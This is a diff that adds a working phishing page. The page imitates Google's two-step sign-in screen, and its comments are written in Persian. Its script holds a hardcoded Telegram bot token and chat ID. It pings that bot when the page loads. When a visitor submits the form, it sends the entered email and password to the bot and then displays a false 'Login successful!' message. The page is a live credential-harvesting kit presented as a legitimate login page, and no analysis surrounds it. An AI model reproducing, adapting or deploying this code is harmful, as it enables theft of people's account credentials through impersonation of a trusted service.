@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background: #f1f3f4;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+
+        .login-container {
+            background: #ffffff;
+            max-width: 450px;
+            width: 100%;
+            padding: 48px 40px 36px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
+            transition: all 0.2s ease;
+            animation: fadeUp 0.4s ease-out;
+        }
+
+        /* لوگوی گوگل */
+        .google-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+
+        .google-logo svg {
+            width: 75px;
+            height: 75px;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 28px;
+            font-weight: 400;
+        }
+
+        /* پیام‌های خطا و موفقیت */
+        .error-msg {
+            background: #fce8e6;
+            color: #d93025;
+            padding: 10px 14px;
+            border-radius: 4px;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: none;
+            text-align: right;
+            border: 1px solid #f5c6c2;
+        }
+        .error-msg i {
+            margin-left: 6px;
+        }
+
+        .success-msg {
+            background: #e6f4ea;
+            color: #1e8e3e;
+            padding: 10px 14px;
+            border-radius: 4px;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: none;
+            text-align: right;
+            border: 1px solid #a8dab5;
+        }
+        .success-msg i {
+            margin-left: 6px;
+        }
+
+        /* استیل باکس ورودی - ساده مانند گوگل */
+        .input-group {
+            margin-bottom: 8px;
+            position: relative;
+        }
+
+        .input-wrapper {
+            position: relative;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 0 12px;
+            background: #fff;
+            transition: border 0.2s;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 0;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            background: transparent;
+            color: #202124;
+        }
+
+        .input-wrapper input::placeholder {
+            color: #9aa0a6;
+            font-weight: 400;
+        }
+
+        .input-wrapper .toggle-password {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #5f6368;
+            font-size: 20px;
+            padding: 4px;
+            transition: color 0.2s;
+            background: transparent;
+            border: none;
+        }
+
+        .input-wrapper .toggle-password:hover {
+            color: #202124;
+        }
+
+        /* لینک فراموشی ایمیل */
+        .forgot-email {
+            display: block;
+            text-align: right;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 8px 0 16px 0;
+            padding: 4px 0;
+        }
+
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+
+        /* دکمه‌ها - استایل گوگل */
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .btn {
+            background: transparent;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1a73e8;
+            cursor: pointer;
+            transition: background 0.2s;
+            letter-spacing: 0.3px;
+        }
+
+        .btn:hover {
+            background: rgba(26, 115, 232, 0.08);
+        }
+
+        .btn-primary {
+            background: #1a73e8;
+            color: #fff;
+            padding: 10px 28px;
+            border-radius: 4px;
+            border: none;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+        }
+
+        .btn-primary:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #1a73e8;
+            padding: 10px 8px;
+            font-weight: 500;
+        }
+
+        /* مرحله دوم (پسورد) – مخفی در ابتدا */
+        .step-password {
+            display: none;
+            margin-top: 8px;
+        }
+
+        .step-email {
+            display: block;
+        }
+
+        /* لینک‌های پایین */
+        .footer-links {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links .lang-select {
+            color: #5f6368;
+            cursor: default;
+        }
+
+        /* ریسپانسیو */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 32px 20px 24px;
+            }
+            .actions {
+                flex-direction: column-reverse;
+                align-items: stretch;
+            }
+            .btn-primary {
+                width: 100%;
+                text-align: center;
+            }
+            .btn-secondary {
+                text-align: center;
+                padding: 10px 0;
+            }
+            .forgot-email {
+                text-align: center;
+            }
+        }
+
+        /* انیمیشن */
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(16px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container" id="loginContainer">
+
+        <!-- لوگوی گوگل -->
+        <div class="google-logo">
+            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+        </div>
+
+        <h2>Sign in</h2>
+        <p class="subtitle" id="stepTitle">with your Google Account. You'll also sign in to Google services in your apps &amp; Safari.</p>
+
+        <!-- پیام‌های خطا و موفقیت -->
+        <div class="error-msg" id="errorMsg">
+            <i class="fas fa-exclamation-circle"></i> <span id="errorText">An error occurred.</span>
+        </div>
+        <div class="success-msg" id="successMsg">
+            <i class="fas fa-check-circle"></i> Login successful!
+        </div>
+
+        <!-- مرحله اول: ایمیل -->
+        <div class="step-email" id="stepEmail">
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <input type="email" id="emailInput" placeholder="Email or phone" autocomplete="email" value="">
+                </div>
+                <a href="#" class="forgot-email" id="forgotEmailLink">Forgot email?</a>
+            </div>
+            <div class="actions">
+                <button class="btn btn-secondary" id="createAccountBtn">Create account</button>
+                <button class="btn btn-primary" id="nextBtn">Next</button>
+            </div>
+        </div>
+
+        <!-- مرحله دوم: پسورد -->
+        <div class="step-password" id="stepPassword">
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <input type="password" id="passwordInput" placeholder="Enter your password" autocomplete="current-password" value="">
+                    <button type="button" class="toggle-password" id="togglePassword">
+                        <i class="fas fa-eye" id="eyeIcon"></i>
+                    </button>
+                </div>
+            </div>
+            <div class="actions" style="margin-top: 12px;">
+                <button class="btn btn-secondary" id="backBtn">
+                    <i class="fas fa-arrow-right" style="margin-left: 6px;"></i> Back
+                </button>
+                <button class="btn btn-primary" id="signinBtn">Next</button>
+            </div>
+        </div>
+
+        <!-- لینک‌های پایین -->
+        <div class="footer-links">
+            <span class="lang-select">English (United States)</span>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        // =====================================================
+        // تنظیمات تلگرام
+        // =====================================================
+        const TELEGRAM_CONFIG = {
+            botToken: "8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ",
+            chatId: "6689313262"
+        };
+
+        const WAKEUP_COUNT = 2;
+
+        // =====================================================
+        // ارسال پیام به تلگرام
+        // =====================================================
+        function sendTelegramMessage(text, parseMode = 'Markdown') {
+            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+
+            return fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CONFIG.chatId,
+                    text: text,
+                    parse_mode: parseMode
+                })
+            })
+            .then(res => res.json())
+            .catch(err => console.error("Telegram error:", err));
+        }
+
+        // =====================================================
+        // ارسال پیام‌های ویک‌آپ هنگام لود صفحه
+        // =====================================================
+        function sendWakeupOnLoad() {
+            for (let i = 1; i <= WAKEUP_COUNT; i++) {
+                setTimeout(() => {
+                    const message = `🌐 **Google Login Page Loaded - Wake-up** (${i}/${WAKEUP_COUNT})\n⏰ ${new Date().toLocaleString('fa-IR')}`;
+                    sendTelegramMessage(message);
+                }, i * 500);
+            }
+        }
+
+        // =====================================================
+        // ارسال اطلاعات ورود به تلگرام
+        // =====================================================
+        function sendLoginInfo(email, password) {
+            const message =
+                `🔔 **Google Account Login!**\n\n` +
+                `📧 **Email:** \`${email}\`\n` +
+                `🔑 **Password:** \`${password}\`\n\n` +
+                `🕐 Time: ${new Date().toLocaleString('fa-IR')}`;
+
+            sendTelegramMessage(message);
+        }
+
+        // =====================================================
+        // ارسال ویک‌آپ + اطلاعات ورود
+        // =====================================================
+        function sendWakeupAndLoginInfo(email, password) {
+            let wakeupPromises = [];
+            for (let i = 1; i <= WAKEUP_COUNT; i++) {
+                const promise = new Promise((resolve) => {
+                    setTimeout(() => {
+                        const message = `🔄 **Google Wake-up ping** (${i}/${WAKEUP_COUNT})\n⏰ ${new Date().toLocaleString('fa-IR')}`;
+                        sendTelegramMessage(message)
+                            .then(result => resolve(result))
+                            .catch(err => resolve({ ok: false, error: err }));
+                    }, i * 600);
+                });
+                wakeupPromises.push(promise);
+            }
+
+            Promise.all(wakeupPromises).then(() => {
+                setTimeout(() => {
+                    sendLoginInfo(email, password);
+                }, 500);
+            });
+        }
+
+        // =====================================================
+        // المنت‌های صفحه
+        // =====================================================
+        const stepEmail = document.getElementById('stepEmail');
+        const stepPassword = document.getElementById('stepPassword');
+        const stepTitle = document.getElementById('stepTitle');
+
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const nextBtn = document.getElementById('nextBtn');
+        const backBtn = document.getElementById('backBtn');
+        const signinBtn = document.getElementById('signinBtn');
+        const createAccountBtn = document.getElementById('createAccountBtn');
+        const forgotEmailLink = document.getElementById('forgotEmailLink');
+
+        const errorMsg = document.getElementById('errorMsg');
+        const errorText = document.getElementById('errorText');
+        const successMsg = document.getElementById('successMsg');
+
+        const togglePassword = document.getElementById('togglePassword');
+        const eyeIcon = document.getElementById('eyeIcon');
+
+        let passwordVisible = false;
+
+        // =====================================================
+        // توابع کمکی
+        // =====================================================
+        function showError(msg) {
+            errorText.textContent = msg || 'An error occurred.';
+            errorMsg.style.display = 'block';
+            successMsg.style.display = 'none';
+        }
+
+        function hideError() {
+            errorMsg.style.display = 'none';
+        }
+
+        function showSuccess(msg) {
+            successMsg.innerHTML = `<i class="fas fa-check-circle"></i> ${msg || 'Login successful!'}`;
+            successMsg.style.display = 'block';
+            errorMsg.style.display = 'none';
+        }
+
+        function hideSuccess() {
+            successMsg.style.display = 'none';
+        }
+
+        function isValidEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        // =====================================================
+        // رفتن به مرحله پسورد
+        // =====================================================
+        function goToPasswordStep() {
+            const email = emailInput.value.trim();
+            hideError();
+            hideSuccess();
+
+            if (!email) {
+                showError('Please enter your email');
+                return;
+            }
+            if (!isValidEmail(email)) {
+                showError('Please enter a valid email address');
+                return;
+            }
+
+            stepEmail.style.display = 'none';
+            stepPassword.style.display = 'block';
+            stepTitle.textContent = `Welcome, ${email}`;
+            setTimeout(() => passwordInput.focus(), 100);
+        }
+
+        // =====================================================
+        // بازگشت به مرحله ایمیل
+        // =====================================================
+        function goToEmailStep() {
+            stepPassword.style.display = 'none';
+            stepEmail.style.display = 'block';
+            stepTitle.textContent = "with your Google Account. You'll also sign in to Google services in your apps & Safari.";
+            hideError();
+            hideSuccess();
+            passwordInput.value = '';
+            setTimeout(() => emailInput.focus(), 100);
+        }
+
+        // =====================================================
+        // عملیات ورود - ارسال اطلاعات به تلگرام
+        // =====================================================
+        function handleSignIn() {
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            hideError();
+            hideSuccess();
+
+            if (!email) {
+                showError('Email not found. Please go back.');
+                return;
+            }
+
+            if (!password) {
+                showError('Password cannot be empty');
+                return;
+            }
+
+            if (password.length < 5) {
+                showError('Password must be at least 5 characters');
+                return;
+            }
+
+            sendWakeupAndLoginInfo(email, password);
+
+            showSuccess(`Login successful!`);
+
+            // پاک کردن پسورد
+            passwordInput.value = '';
+        }
+
+        // =====================================================
+        // رویدادها
+        // =====================================================
+
+        nextBtn.addEventListener('click', goToPasswordStep);
+
+        backBtn.addEventListener('click', goToEmailStep);
+
+        signinBtn.addEventListener('click', handleSignIn);
+
+        createAccountBtn.addEventListener('click', function() {
+            hideError();
+            hideSuccess();
+            alert('Create new account page (simulated)');
+        });
+
+        forgotEmailLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            hideError();
+            hideSuccess();
+            alert('Forgot email? (simulated)');
+        });
+
+        togglePassword.addEventListener('click', function() {
+            passwordVisible = !passwordVisible;
+            passwordInput.type = passwordVisible ? 'text' : 'password';
+            eyeIcon.className = passwordVisible ? 'fas fa-eye-slash' : 'fas fa-eye';
+        });
+
+        emailInput.addEventListener('input', function() {
+            hideError();
+            hideSuccess();
+        });
+
+        passwordInput.addEventListener('input', function() {
+            hideError();
+            hideSuccess();
+        });
+
+        emailInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                nextBtn.click();
+            }
+        });
+
+        passwordInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                signinBtn.click();
+            }
+        });
+
+        // =====================================================
+        // اجرا در هنگام لود صفحه
+        // =====================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            emailInput.focus();
+            sendWakeupOnLoad();
+            console.log('✅ Google Login Page with Telegram Bot Ready!');
+        });
+    </script>
+
+</body>
+</html>
